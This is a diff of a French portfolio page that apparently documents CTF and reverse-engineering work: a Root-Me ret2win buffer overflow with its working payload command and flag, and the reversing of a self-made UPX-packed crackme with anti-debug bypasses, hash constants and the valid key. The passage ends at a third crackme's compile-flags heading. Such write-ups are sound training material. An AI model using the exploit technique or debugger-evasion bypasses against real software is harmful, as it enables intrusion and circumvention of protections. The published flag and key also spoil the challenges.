@@ -3,8 +3,8 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>CTF & Reverse Engineering : ret2win, unpacking & une suite de 80 crackmes · Mohamed Salhi</title>
-<meta name="description" content="Sélection de reverse engineering : un stack buffer overflow ret2win sur Root-Me, l'analyse d'un crackme ELF packé UPX, et une suite de ~80 crackmes auto-générés avec solveurs scriptés.">
+<title>CTF &amp; Reverse Engineering : ret2win, deux crackmes maison, et une plateforme CTF · Mohamed Salhi</title>
+<meta name="description" content="Reverse engineering de bout en bout : un stack buffer overflow ret2win (PE32 x86, Root-Me ch72), deux crackmes que j'ai concu puis reverse (un license checker UPX a hash Feistel maison + anti-debug TracerPid, un crackme XOR a anti-debug ptrace), et le backend FastAPI d'une plateforme CTF (Hexgate) threat-modelisee.">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400..900;1,9..144,400..700&family=IBM+Plex+Sans:wght@300;400;600&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -22,67 +22,459 @@
 
 <article class="wrap">
   <div class="kicker">CTF · Reverse engineering</div>
-  <h1 class="title">CTF &amp; RE : ret2win, unpacking, et une suite de 80 crackmes</h1>
+  <h1 class="title">CTF &amp; RE : ret2win, deux crackmes maison, et une plateforme CTF</h1>
   <div class="meta">
     <span class="m date">2026</span>
-    <span class="m">Root-Me · ELF/PE</span>
-    <span class="m">IDA · gdb+pwndbg · pwntools</span>
+    <span class="m">Root-Me · PE32 / ELF64</span>
+    <span class="m">IDA · Ghidra · gdb+pwndbg</span>
+    <span class="m">UPX · pwntools · FastAPI</span>
   </div>
-  <p class="lead">Trois angles de reverse : une <em>exploitation binaire</em> propre (ret2win) sur Root-Me, le <em>dé-packing</em> et l'analyse d'un crackme protégé, et un projet à part — un <em>générateur</em> de ~80 crackmes que je résous par script.</p>
+  <p class="lead">Quatre angles de reverse et d'outillage : une <em>exploitation binaire</em> propre (ret2win) sur Root-Me, puis deux crackmes que je <em>concois puis casse</em> — un license checker packe UPX a quatre couches de defense (hash Feistel maison, anti-debug TracerPid, obfuscation XOR, branche leurre), un crackme XOR mono-octet a anti-debug <code>ptrace</code> — et enfin le <em>backend d'une plateforme CTF</em> que j'ai bati et threat-modelise. Concevoir les defis et les resoudre.</p>
+
+  <div class="note">
+    <span class="lbl">Cadre &amp; honnetete</span>
+    Le challenge Root-Me est un exercice public et autorise d'une plateforme d'entrainement. Les deux crackmes qui suivent sont des binaires <b>que j'ai ecrits moi-meme</b> — j'en possede le code source, donc le « ground truth » est verifiable — puis que je re-reverse a froid comme si je ne les connaissais pas. Concevoir des protections et les defaire dans un meme cycle est un exercice a double tranchant : on comprend une defense en la construisant, et on l'evalue en la cassant. Ce sont deux challenges soignes, pas une chaine d'usine.
+  </div>
+
+  <!-- ================================================================ -->
+  <!-- SECTION 01 — Root-Me ch72 ret2win                               -->
+  <!-- ================================================================ -->
 
   <h2><span class="n">01</span> Root-Me — Stack buffer overflow &amp; ret2win</h2><div class="rule"></div>
-  <p>Challenge <code>app-systeme-ch72</code> : un PE32 x86 qui lit son entrée avec une fonction de type <code>gets()</code> dans un buffer de 16 octets, sans contrôle de longueur. Objectif : lire un fichier protégé appartenant à un autre utilisateur.</p>
+  <p>Challenge <code>app-systeme-ch72</code> : un executable <b>PE32 Windows x86</b> (<code>ch72.exe</code>), tournant sous Cygwin64 sur une machine Windows&nbsp;10 (<code>10.0.17763</code>, hote <code>challenge05</code>). Il lit son entree avec une routine de type <code>gets()</code> dans un buffer de 16 octets, <b>sans aucun controle de longueur</b>. Objectif : lire <code>$HOME/.passwd</code>, un fichier appartenant a l'utilisateur <code>app-systeme-ch72-crk</code> et lisible uniquement par lui — alors que la session SSH tourne sous <code>app-systeme-ch72</code>.</p>
+
   <table class="tbl">
-    <thead><tr><th>Protection</th><th>État</th></tr></thead>
+    <thead><tr><th>Protection</th><th>Etat</th><th>Consequence</th></tr></thead>
     <tbody>
-      <tr><td>ASLR</td><td>OFF</td></tr>
-      <tr><td>DEP</td><td>OFF</td></tr>
-      <tr><td>Stack cookie (<code>main</code>)</td><td>absent</td></tr>
+      <tr><td>ASLR</td><td>OFF</td><td>adresses statiques &rarr; on peut coder <code>give_shell</code> en dur</td></tr>
+      <tr><td>DEP / NX</td><td>OFF</td><td>(non necessaire ici — on ne fait pas de shellcode)</td></tr>
+      <tr><td>SafeSEH</td><td>ON</td><td>ecarte une exploitation par chaine SEH &rarr; on vise directement <code>ret</code></td></tr>
+      <tr><td>Stack cookie (<code>main</code>)</td><td>absent</td><td>aucun canari a contourner sur la fonction vulnerable</td></tr>
     </tbody>
   </table>
-  <p>Avec ASLR/DEP off et pas de cookie, c'est un <b>ret2win</b> : il existe une fonction cadeau qui <code>system()</code> un shell. Il suffit d'écraser l'adresse de retour de <code>main</code> par la sienne.</p>
+  <p>Sans ASLR, sans cookie, et avec une <b>fonction cadeau</b> deja presente qui appelle <code>system()</code>, l'exploitation la plus propre est un <b>ret2win</b> : on n'injecte rien, on ecrase juste l'adresse de retour de <code>main</code> par celle de <code>give_shell</code>. SafeSEH etant ON, une exploitation par chaine SEH est ecartee — c'est le ret classique qui est le vecteur.</p>
+
+  <h3>Cartographie du binaire</h3>
+  <table class="tbl">
+    <thead><tr><th>Adresse</th><th>Symbole / role</th></tr></thead>
+    <tbody>
+      <tr><td><code>0x401000</code></td><td><code>give_shell</code> — pousse le chemin de <code>cmd.exe</code>, appelle <code>system()</code></td></tr>
+      <tr><td><code>0x401020</code></td><td><code>main()</code> — la fonction vulnerable</td></tr>
+      <tr><td><code>0x4040db</code></td><td>point d'entree du lecteur d'entree</td></tr>
+      <tr><td><code>0x403f8c</code></td><td>boucle de lecture interne — lit octet par octet jusqu'a <code>\n</code> ou <code>\xff</code></td></tr>
+      <tr><td><code>0x403bcc</code></td><td>stub IAT de <code>system()</code></td></tr>
+      <tr><td><code>0x41b000</code></td><td>litteral <code>"C:\Windows\system32\cmd.exe"</code></td></tr>
+    </tbody>
+  </table>
   <pre><code><span class="cm">; give_shell @ 0x401000 — la cible ret2win</span>
 <span class="ad">0x401000</span>  <span class="kw">push</span>  <span class="ad">0x41b000</span>       <span class="st">; "C:\Windows\system32\cmd.exe"</span>
 <span class="ad">0x401005</span>  <span class="kw">call</span>  <span class="ad">0x403bcc</span>       <span class="cm">; system()</span>
+<span class="ad">0x40100a</span>  <span class="kw">add</span>   esp, 4          <span class="cm">; nettoie l'argument</span>
 <span class="ad">0x40100d</span>  <span class="kw">ret</span></code></pre>
-  <p>Layout de pile de <code>main</code> : buffer 16 o → counter 4 o → saved EBP 4 o → <b>return address</b>. Le padding est donc de 24 octets avant d'atteindre EIP, qu'on remplace par <code>0x401000</code>.</p>
-  <pre><code><span class="cm"># payload</span>
-payload = <span class="st">b"A"</span>*24 + p32(<span class="ad">0x401000</span>)   <span class="cm"># ret → give_shell → cmd.exe</span></code></pre>
-  <div class="result"><span class="t">Flag</span> 466aa7907db6…1388c7</div>
+  <p><code>give_shell</code> appelle <code>system("cmd.exe")</code>, ce qui lance un <code>cmd.exe</code> interactif heritant du <code>stdin</code>/<code>stdout</code> de l'appelant — exactement ce qu'il faut pour rejouer des commandes derriere l'exploit.</p>
 
-  <h2><span class="n">02</span> Crackme ELF packé UPX</h2><div class="rule"></div>
-  <p>Cible : un ELF 64-bit PIE, <b>strippé</b> et <b>packé UPX 4.2.2</b> (6,7 Ko → 15 Ko une fois déballé). Le workflow de RE d'un binaire protégé, en condensé :</p>
-  <div class="steps">
-    <div class="step"><b>Triage</b> : <code>file</code>, entropie, sections — l'entropie élevée + les tags <code>UPX!</code> trahissent le packer.</div>
-    <div class="step"><b>Unpacking</b> : restauration de l'image déballée pour retrouver un binaire analysable statiquement.</div>
-    <div class="step"><b>Statique</b> : reconstruction de la logique de validation (routine de check, transformations sur l'entrée).</div>
-    <div class="step"><b>Dynamique</b> : gdb+pwndbg pour confirmer le flux, court-circuiter l'anti-debug, observer la comparaison finale.</div>
-    <div class="step"><b>Solve</b> : inverser la transformation pour reconstruire l'entrée acceptée.</div>
+  <h3>Layout de pile de <code>main</code></h3>
+  <pre><code><span class="cm">; pile de main() — adresses hautes en haut</span>
++------------------+
+|  return address  |  <span class="cm">&larr; cible : on ecrit ici 0x00401000</span>
++------------------+
+|   saved EBP      |  <span class="cm">4 octets</span>
++------------------+
+|   counter        |  <span class="cm">4 octets — compteur de la boucle toupper</span>
++------------------+
+|   buffer[16]     |  <span class="cm">16 octets — l'entree commence ici</span>
++------------------+
+<span class="cm">padding jusqu'a EIP = 16 + 4 + 4 = 24 octets</span></code></pre>
+  <p>Le padding pour atteindre l'adresse de retour est donc de <b>24 octets</b> : 16 (buffer) + 4 (counter) + 4 (saved EBP). Ensuite on place l'adresse de <code>give_shell</code>.</p>
+
+  <h3>Comportement du lecteur d'entree</h3>
+  <p>Le lecteur a <code>0x403f8c</code> lit les octets un par un dans le buffer de pile <b>sans aucune borne</b>. Il s'arrete uniquement sur <code>0x0a</code> (<code>\n</code>) ou <code>0xff</code>. Les octets nuls (<code>0x00</code>) passent — ce qui est critique car l'adresse de retour <code>0x00401000</code> contient un null byte en poids fort. Apres lecture, <code>main</code> passe un <code>toupper</code> sur les 16 premiers octets seulement (le buffer declare), et le compteur est remis a 0 apres le debordement : les octets 16 a 27, dont notre adresse, ne sont jamais modifies.</p>
+
+  <div class="note warn">
+    <span class="lbl">Piege #1 — octet nul dans l'adresse</span>
+    L'adresse de retour <code>0x00401000</code> contient un octet nul en poids fort. Beaucoup de lecteurs s'arretent sur <code>\0</code> — pas celui-ci. La boucle de lecture a <code>0x403f8c</code> ne s'arrete que sur <code>\n</code> (<code>0x0a</code>) ou <code>0xff</code> : les octets nuls <b>passent</b>. Toujours verifier la condition d'arret exacte du lecteur avant d'ecarter une adresse « a cause d'un null byte ».
   </div>
-  <p class="small">La même démarche que sur un échantillon suspect : identifier la protection, la retirer, isoler la logique utile, prouver le comportement.</p>
+  <div class="note warn">
+    <span class="lbl">Piege #2 — la boucle toupper ne couvre pas l'overflow</span>
+    Apres lecture, <code>main</code> passe un <code>toupper</code> sur les octets 0-15 <b>seulement</b> (le buffer declare), et son compteur est remis a 0 apres le debordement. Les octets 16-27 — dont notre adresse de retour — ne sont jamais mis en majuscule : l'adresse est preservee intacte. Une passe de « sanitisation » bornee au buffer declare est triviale a deborder ; il faut lire les bornes de boucle dans le desassemblage, pas les supposer.
+  </div>
 
-  <h2><span class="n">03</span> Projet : un générateur de ~80 crackmes</h2><div class="rule"></div>
-  <p>Pour m'entraîner (et entraîner d'autres), j'ai écrit un <b>générateur</b> qui produit ~80 crackmes répartis en tiers de difficulté, chacun accompagné d'un <b>solveur scripté</b>. C'est autant un exercice de RE que de construction d'outils.</p>
+  <h3>Modele de privileges — la vraie difficulte</h3>
+  <p>Ecraser EIP ne suffit pas : encore faut-il que le shell obtenu tourne avec le bon jeton d'acces. Le fichier n'est lisible que par <code>-crk</code> :</p>
+  <pre><code>$ icacls .passwd
+.passwd  CHALLENGE05\app-systeme-ch72-crk:(R)     <span class="cm">; lecture reservee</span>
+         NT AUTHORITY\SYSTEM:(F)
+         BUILTIN\Administrators:(F)
+$ type .passwd
+Access is denied.                                <span class="cm">; sous app-systeme-ch72 &rarr; refuse</span></code></pre>
+  <p>Root-Me fournit le mecanisme d'elevation classique : un <code>wrapper.sh</code> qui ouvre une session SSH sans mot de passe vers le compte <code>-crk</code>, dont le shell de connexion est precisement <code>ch72.exe</code>. En faisant passer l'exploit <b>a travers</b> le wrapper, le processus exploite — et le <code>cmd.exe</code> qu'il lance — herite du jeton de securite de <code>-crk</code>.</p>
+  <pre><code><span class="cm"># wrapper.sh — porte le token du bon utilisateur</span>
+ssh -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
+    -i .ssh/id_rsa app-systeme-ch72-crk@localhost</code></pre>
+
+  <h3>Payload &amp; timing</h3>
+  <pre><code><span class="cm"># structure du payload</span>
+[ 'A' * 24 ] [ \x00\x10\x40\x00 ] [ \n ]
+   padding      give_shell (LE)     termine le lecteur</code></pre>
+  <p>L'adresse est ecrite en little-endian : <code>0x00401000</code> &rarr; <code>\x00\x10\x40\x00</code>. Le <code>\n</code> final termine la boucle de lecture pour que <code>main</code> atteigne son <code>ret</code>.</p>
+  <div class="note danger">
+    <span class="lbl">Piege #3 — l'EOF du pipe tue le shell enfant</span>
+    Si l'exploit est envoye via un sous-shell qui se termine aussitot, le <b>bout ecriture du pipe se ferme</b> avant que <code>cmd.exe</code> n'ait fini de demarrer : il voit un EOF immediat sur <code>stdin</code> et sort — on n'obtient que la banniere, aucune commande executee. Un <code>sleep 1</code> entre le payload et la commande de suivi garde le pipe ouvert le temps que <code>system()</code> spawn le processus. La sequence : Perl ecrit le payload &rarr; <code>ch72.exe</code> deborde &rarr; <code>ret</code> &rarr; <code>give_shell</code> appelle <code>system("cmd.exe")</code> &rarr; <code>sleep 1</code> maintient le pipe pendant le spawn &rarr; <code>echo</code> envoie la commande &rarr; <code>cmd.exe</code> la lit et l'execute.
+  </div>
+  <pre><code><span class="cm"># exploit final — envoye a travers wrapper.sh</span>
+(perl -e <span class="st">'print "A"x24 . "\x00\x10\x40\x00\n"'</span>; sleep 1; echo <span class="st">'type .passwd'</span>) | ./wrapper.sh</code></pre>
+  <pre><code><span class="cm"># trace d'execution</span>
+[local]      perl ecrit : AAAA...(24)...\x00\x10\x40\x00\n
+[local]      sleep 1 garde le pipe ouvert
+[ssh]        login app-systeme-ch72-crk &rarr; ch72.exe tourne sous -crk
+[ch72.exe]   le lecteur deborde le buffer jusqu'au slot return address
+[ch72.exe]   main() ret &rarr; EIP = 0x00401000 (give_shell)
+[give_shell] system("...\cmd.exe") — spawn du process
+[cmd.exe]    herite stdin/stdout de la session SSH
+[local]      echo envoie : type .passwd
+[cmd.exe]    execute &rarr; lit le fichier avec le token -crk
+[output]     466aa7907db65a182fe0cc97931388c7</code></pre>
+  <div class="result"><span class="t">Flag</span> 466aa7907db65a182fe0cc97931388c7</div>
+
+  <h3>Lecons</h3>
+  <ul>
+    <li><b>Null bytes dans l'adresse</b> : verifier la condition d'arret exacte du lecteur d'entree — <code>0x00</code> passe si le stop est <code>\n</code>/<code>\xff</code>.</li>
+    <li><b>Boucle de sanitisation bornee</b> : le <code>toupper</code> ne couvre que les 16 premiers octets ; les bytes de l'overflow restent intacts. Lire les bornes dans le desassemblage, pas les supposer.</li>
+    <li><b>Timing du pipe</b> : quand on chaine « exploit &rarr; processus enfant interactif » via un pipe, le bout ecriture doit rester ouvert jusqu'a ce que le processus enfant ait demarre et lise son stdin.</li>
+    <li><b>Contexte d'execution</b> : un meme payload donne des acces totalement differents selon le jeton utilisateur. Toujours verifier <code>icacls</code> / ACLs pour comprendre qui possede la cible, puis trouver le mecanisme (SUID, wrapper SSH) qui porte le bon token.</li>
+  </ul>
+
+  <!-- ================================================================ -->
+  <!-- SECTION 02 — Crackme v1 / crackme_packed                        -->
+  <!-- ================================================================ -->
+
+  <h2><span class="n">02</span> Crackme maison #1 — license checker packe UPX (je le concois, puis je le casse)</h2><div class="rule"></div>
+  <p>Premier crackme que j'ai ecrit : un <b>verificateur de licence</b> avec quatre defenses empilees, compile puis <b>packe UPX</b>, distribue strippe. Le double exercice est interessant : concevoir des protections qui tiennent la route <i>et</i> les defaire a froid, sans regarder le source.</p>
+
   <table class="tbl">
-    <thead><tr><th>Tier</th><th>Techniques couvertes</th></tr></thead>
+    <thead><tr><th>Champ</th><th>Valeur</th></tr></thead>
     <tbody>
-      <tr><td>1 — Warmup</td><td><code>strings</code>, <code>strcmp</code>, assemblage de chaîne à l'exécution</td></tr>
-      <tr><td>2 — Encodages</td><td>XOR mono-octet, XOR à clé, base64</td></tr>
-      <tr><td>3 — Logique</td><td>équations, transformations arithmétiques, inversions</td></tr>
-      <tr><td>4 — Obfuscation</td><td>machines virtuelles maison, chaînes reconstruites</td></tr>
-      <tr><td>5 — Anti-analyse</td><td>anti-debug, entrées via argv multiples / variables d'env</td></tr>
+      <tr><td>Fichier</td><td><code>crackme_packed</code></td></tr>
+      <tr><td>Type</td><td>ELF 64-bit LSB PIE executable, x86-64</td></tr>
+      <tr><td>Packer</td><td>UPX 4.2.2, <code>--best</code></td></tr>
+      <tr><td>Taille packee</td><td>6,7 Ko (ratio 47 %)</td></tr>
+      <tr><td>Taille deballee</td><td>~15 Ko</td></tr>
+      <tr><td>Symboles</td><td><b>Strippes</b> — pas de <code>main</code> dans <code>.symtab</code></td></tr>
+      <tr><td>Compilateur</td><td>GCC (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0</td></tr>
+      <tr><td>GLIBC</td><td>2.34</td></tr>
+      <tr><td>Point d'entree (packe)</td><td><code>0x5c80</code></td></tr>
     </tbody>
   </table>
-  <pre><code><span class="cm"># chaque crackme a son solveur — pattern type (XOR)</span>
-key = <span class="ad">0x5A</span>
-flag = bytes(c ^ key <span class="kw">for</span> c <span class="kw">in</span> stored)   <span class="cm"># password[i] ^ 0x5A</span></code></pre>
-  <div class="result"><span class="t">Livrable</span> ~80 crackmes générés + solveurs (Python / pwntools)</div>
+
+  <h3>Imports — ce que le binaire utilise</h3>
+  <p>La table d'imports du binaire deballe revele les briques de chaque couche de defense :</p>
+  <table class="tbl">
+    <thead><tr><th>Fonction</th><th>GLIBC</th><th>Role dans le crackme</th></tr></thead>
+    <tbody>
+      <tr><td><code>open</code></td><td>2.2.5</td><td>Ouvre <code>/proc/self/status</code> (anti-debug)</td></tr>
+      <tr><td><code>read</code></td><td>2.2.5</td><td>Lit le contenu du pseudo-fichier dans un buffer 2 Ko</td></tr>
+      <tr><td><code>close</code></td><td>2.2.5</td><td>Ferme le descripteur apres lecture</td></tr>
+      <tr><td><code>strstr</code></td><td>2.2.5</td><td>Cherche <code>"TracerPid:"</code> dans le buffer</td></tr>
+      <tr><td><code>strlen</code></td><td>2.2.5</td><td>Verifie <code>strlen == 9</code> dans <code>check_format</code></td></tr>
+      <tr><td><code>__ctype_b_loc</code></td><td>2.3</td><td>Classification de caracteres — valide <code>[A-Z0-9]</code></td></tr>
+      <tr><td><code>putc</code></td><td>2.2.5</td><td>Sortie caractere par caractere dans <code>xprint()</code></td></tr>
+      <tr><td><code>stdout</code></td><td>2.2.5</td><td>Flux de sortie pour <code>putc</code></td></tr>
+      <tr><td><code>__stack_chk_fail</code></td><td>2.4</td><td>Protection de pile (emise par GCC, non exploitable ici)</td></tr>
+    </tbody>
+  </table>
+
+  <h3>Les quatre couches de defense</h3>
+  <table class="tbl">
+    <thead><tr><th>Couche</th><th>Defense</th><th>Role</th></tr></thead>
+    <tbody>
+      <tr><td>1</td><td>Packing UPX <code>--best</code></td><td>Masque le code et les chaines a l'analyse statique naive. Magie <code>UPX!</code> et auto-reference <code>/proc/self/exe</code> (le stub de decompression) trahissent le packer.</td></tr>
+      <tr><td>2</td><td>Anti-debug <code>/proc/self/status</code></td><td>Detecte un tracer via <code>TracerPid</code> : <code>open()</code> &rarr; <code>read()</code> 2 Ko &rarr; <code>strstr("TracerPid:")</code> &rarr; <code>strtol()</code>. Sous debugger, <code>TracerPid != 0</code> &rarr; sortie.</td></tr>
+      <tr><td>3</td><td>Chaines XOR <code>0x37</code></td><td>Aucun texte lisible dans <code>.rodata</code> ; <code>xprint()</code> decode chaque octet a la volee avant <code>putc()</code></td></tr>
+      <tr><td>4</td><td>Hash Feistel maison + branche leurre</td><td>Le vrai gate, camouflage derriere un faux « presque »</td></tr>
+    </tbody>
+  </table>
+
+  <h3>Pipeline de reverse</h3>
+  <div class="steps">
+    <div class="step"><b>Triage</b> : <code>file</code>, entropie, sections — l'entropie elevee, la magie <code>UPX!</code> dans les headers et l'auto-reference <code>/proc/self/exe</code> (le stub de decompression se relit lui-meme) trahissent le packer. <code>strings</code> ne rend que du bruit.</div>
+    <div class="step"><b>Unpacking</b> : <code>upx -d crackme_packed -o crackme_unpacked</code> — UPX standard, deballage trivial, on retrouve un ELF analysable statiquement avec ses sections completes (<code>.rodata</code>, <code>.plt</code>, etc.).</div>
+    <div class="step"><b>Detection de l'anti-debug</b> : dans l'IOC de l'hote, <code>/proc/self/status</code> apparait — signe d'un check TracerPid. Localiser la fonction <code>debugger_present</code> via les xrefs a <code>open</code> &rarr; <code>read</code> &rarr; <code>strstr</code>. Bypass : patcher le <code>test eax,eax / jnz</code> qui suit pour forcer le chemin propre, ou <code>LD_PRELOAD</code> pour hooker <code>open()</code> et rendre un faux <code>status</code>.</div>
+    <div class="step"><b>Recuperation des chaines</b> : reperer <code>xprint()</code> (boucle qui XOR un tableau d'octets puis <code>putc</code>), confirmer la cle <code>0x37</code>, scripter le decodage de tous les blobs de <code>.rodata</code>. Resultat : 7 chaines decodees — banniere, usage, message de debug, format invalide, « Almost... not quite. », « Access granted. Welcome! », « Wrong key. ».</div>
+    <div class="step"><b>Graphe d'appel</b> : depuis <code>main</code>, isoler les trois fonctions de validation et l'ordre dans lequel elles gardent le chemin « acces accorde ». Ordre : <code>check_format</code> &rarr; <code>check_xor_sum</code> &rarr; <code>check_hash</code>.</div>
+    <div class="step"><b>Reverse du hash</b> : identifier la structure Feistel dans <code>check_hash</code>, extraire les constantes (<code>0xCAFEBABE</code>, <code>0xDEADC0DE</code>, <code>0x9E3779B9</code>, 4 rounds, <code>rotl32(f, 13)</code>).</div>
+    <div class="step"><b>Keygen</b> : brute-force de l'espace <code>[A-Z0-9]^8</code> filtre d'abord par le checksum <code>0x2F</code> (rapide a evaluer), puis valide par <code>feistel_hash == 0x8FCDA6FB</code>.</div>
+  </div>
+
+  <div class="note warn">
+    <span class="lbl">Anti-debug — TracerPid</span>
+    Ouvre <code>/proc/self/status</code> en lecture via <code>open(O_RDONLY)</code>, charge dans un buffer de 2 Ko via <code>read()</code>, puis <code>strstr("TracerPid:")</code> pour localiser la ligne et <code>strtol()</code> pour parser l'entier. Sous debugger, le noyau ecrit le PID du tracer dans <code>TracerPid</code> (non-zero) et le binaire sort. <b>Bypass :</b> patcher le <code>test eax,eax / jnz</code> qui suit pour forcer le chemin propre, ou <code>LD_PRELOAD</code> pour hooker <code>open()</code> et rendre un faux fichier status avec <code>TracerPid:\t0</code>.
+  </div>
+  <div class="note warn">
+    <span class="lbl">Obfuscation de chaines — XOR 0x37</span>
+    Toutes les chaines visibles (banniere, usage, messages de resultat) sont stockees en tableaux d'octets XOR-encodes dans <code>.rodata</code> ; <code>xprint()</code> decode a la volee avant <code>putc()</code>. Un <code>strings</code> naif ne rend rien d'exploitable. Recuperation :
+    <br><code>python3 -c "print(''.join(chr(b^0x37) for b in enc))"</code>
+  </div>
+
+  <h3>Flux d'execution</h3>
+  <p>Le chemin complet a travers <code>main</code> :</p>
+  <pre><code><span class="cm">; flux d'execution simplifie de main</span>
+main()
+  <span class="kw">&rarr;</span> xprint(banner)                    <span class="cm">; decode + affiche la banniere</span>
+  <span class="kw">&rarr;</span> argc == 2 ?                        <span class="cm">; sinon : xprint(usage) &rarr; exit(1)</span>
+  <span class="kw">&rarr;</span> debugger_present() ?               <span class="cm">; TracerPid != 0 &rarr; exit(1)</span>
+  <span class="kw">&rarr;</span> check_format(argv[1])              <span class="cm">; strlen==9, [4]=='-', [A-Z0-9]</span>
+  <span class="kw">&rarr;</span> check_xor_sum(argv[1])             <span class="cm">; even ^ odd == 0x2F</span>
+  <span class="kw">&rarr;</span> check_hash(argv[1])                <span class="cm">; feistel_hash == 0x8FCDA6FB</span>
+       <span class="cm">; si checksum OK mais hash KO &rarr; "Almost... not quite." (LEURRE)</span>
+       <span class="cm">; si tout KO &rarr; "Wrong key."</span>
+       <span class="cm">; si tout OK &rarr; "Access granted. Welcome!"</span></code></pre>
+
+  <h3>Les trois gates de validation</h3>
+  <table class="tbl">
+    <thead><tr><th>Etape</th><th>Fonction</th><th>Verification</th><th>Cible</th></tr></thead>
+    <tbody>
+      <tr><td>1</td><td><code>check_format</code></td><td><code>strlen == 9</code>, <code>in[4] == '-'</code>, caracteres <code>[A-Z0-9]</code> (via <code>__ctype_b_loc</code>)</td><td>format <code>XXXX-XXXX</code></td></tr>
+      <tr><td>2</td><td><code>check_xor_sum</code></td><td>retire le tiret &rarr; 8 octets, <code>even_sum ^ odd_sum</code></td><td><code>0x2F</code></td></tr>
+      <tr><td>3</td><td><code>check_hash</code></td><td>retire le tiret &rarr; 8 octets &rarr; <code>feistel_hash()</code></td><td><code>0x8FCDA6FB</code></td></tr>
+    </tbody>
+  </table>
+
+  <h3>Feistel hash — structure interne</h3>
+  <pre><code><span class="cm">; feistel_hash(key8) — hash maison, 4 rounds sur 8 octets (32 iterations)</span>
+L = <span class="ad">0xCAFEBABE</span>
+R = <span class="ad">0xDEADC0DE</span>
+<span class="kw">for</span> round <span class="kw">in</span> 0..3:
+    <span class="kw">for</span> i <span class="kw">in</span> 0..7:
+        f   = (R ^ (key[i] * <span class="ad">0x9E3779B9</span>)) + round   <span class="cm">; golden ratio constant</span>
+        f   = rotl32(f, 13)
+        tmp = L ^ f
+        L   = R
+        R   = tmp
+<span class="kw">return</span> L ^ R                                  <span class="cm">; cible : 0x8FCDA6FB</span></code></pre>
+  <p>Le multiplicateur <code>0x9E3779B9</code> est la constante du nombre d'or (famille FNV/Murmur) — un choix classique pour disperser les bits. <code>rotl32(f, 13)</code> assure le melange non-lineaire. Le hash final est <code>L ^ R</code> apres 32 iterations.</p>
+
+  <table class="tbl">
+    <thead><tr><th>Constante</th><th>Valeur</th><th>Role</th></tr></thead>
+    <tbody>
+      <tr><td>Seed L</td><td><code>0xCAFEBABE</code></td><td>demi-etat gauche initial</td></tr>
+      <tr><td>Seed R</td><td><code>0xDEADC0DE</code></td><td>demi-etat droit initial</td></tr>
+      <tr><td>Multiplicateur</td><td><code>0x9E3779B9</code></td><td>dispersion des bits (nombre d'or)</td></tr>
+      <tr><td>Rotation</td><td>13 bits a gauche</td><td>melange non-lineaire</td></tr>
+      <tr><td>Rounds</td><td>4 passes &times; 8 chars = 32 iterations</td><td></td></tr>
+      <tr><td>Cible checksum</td><td><code>0x2F</code></td><td><code>even_sum ^ odd_sum</code></td></tr>
+      <tr><td>Cible hash</td><td><code>0x8FCDA6FB</code></td><td><code>feistel_hash(key8)</code></td></tr>
+    </tbody>
+  </table>
+
+  <div class="note danger">
+    <span class="lbl">Piege — la branche leurre</span>
+    Si le checksum (etape 2) passe mais que le hash Feistel echoue, le binaire affiche <b><code>"Almost... not quite."</code></b> au lieu de <code>"Wrong key."</code>. C'est delibere : ca pousse le reverser a croire que le checksum est le seul gate et a s'acharner dessus, alors que le vrai verrou est le hash. Un reverser presse livre une « solution » qui satisfait seulement l'etape 2 — et ne comprend pas pourquoi elle ne marche pas.
+  </div>
+  <p>Le keygen brute-force l'espace des 8 caracteres <code>[A-Z0-9]</code> filtre d'abord par le checksum <code>0x2F</code> (rapide), puis valide par <code>feistel_hash == 0x8FCDA6FB</code>. La cle tombe :</p>
+  <div class="result"><span class="t">Cle valide</span> FLAG-CTFX</div>
+  <p class="small">Verification : 9 caracteres, tiret en position 4, alphanumerique majuscule &mdash; <code>(F+A+G+X) ^ (L+C+F+T) = 0x2F</code> &mdash; <code>feistel_hash("FLAGCTFX") = 0x8FCDA6FB</code>.</p>
+
+  <div class="note">
+    <span class="lbl">Cote conception — pourquoi quatre couches ?</span>
+    Chaque couche s'adresse a un profil de reverser : le packing UPX bloque le debutant qui n'a que <code>strings</code>. Le XOR <code>0x37</code> arrete celui qui deballe mais ne sait pas scripter. L'anti-debug punit le reflexe « je lance sous gdb d'abord ». Et la branche leurre piege l'intermediaire qui trouve le checksum et s'arrete la. Seul le parcours complet — deballer, decoder, identifier les trois gates, reverser le hash — mene a la cle. Concevoir cette graduation est en soi un exercice de design.
+  </div>
+
+  <!-- ================================================================ -->
+  <!-- SECTION 03 — Crackme v2                                         -->
+  <!-- ================================================================ -->
+
+  <h2><span class="n">03</span> Crackme maison #2 — XOR mono-octet + anti-debug <code>ptrace</code></h2><div class="rule"></div>
+  <p>Deuxieme crackme, volontairement d'un tier plus accessible (difficulte 2/5, ~5-10 min pour un solveur aguerri) : pas de packing, symboles conserves, une seule protection et un encodage simple — mais deux petits pieges de lecture. L'objectif de conception : un challenge d'entree de gamme solvable en 15 a 30 minutes par quelqu'un a l'aise avec Ghidra ou radare2.</p>
+
+  <table class="tbl">
+    <thead><tr><th>Champ</th><th>Valeur</th></tr></thead>
+    <tbody>
+      <tr><td>Fichier</td><td><code>crackme-v2</code></td></tr>
+      <tr><td>Type</td><td>ELF 64-bit LSB executable, x86-64, <code>ET_EXEC</code> (non-PIE)</td></tr>
+      <tr><td>Linkage</td><td>Dynamique (<code>libc.so.6</code>)</td></tr>
+      <tr><td>Symboles</td><td><b>Non strippe</b> — <code>.symtab</code> present, <code>main</code> conserve</td></tr>
+      <tr><td>BuildID (SHA1)</td><td><code>ebdba2606f714d51b5bc36eb2d5a247203c7a770</code></td></tr>
+      <tr><td>SHA256</td><td><code>99797f0dc979...444a700a</code></td></tr>
+      <tr><td>Compilateur</td><td>GCC (Debian 14.2.0-19) 14.2.0</td></tr>
+      <tr><td>Entree</td><td><code>0x401090</code></td></tr>
+      <tr><td>Taille</td><td>16 080 octets</td></tr>
+      <tr><td>Source dans <code>.symtab</code></td><td><code>crackme-v2.c</code></td></tr>
+    </tbody>
+  </table>
+
+  <h3>Choix de conception — flags de compilation</h3>
+  <p>Le binaire est compile avec des flags deliberement permissifs pour calibrer la difficulte :</p>
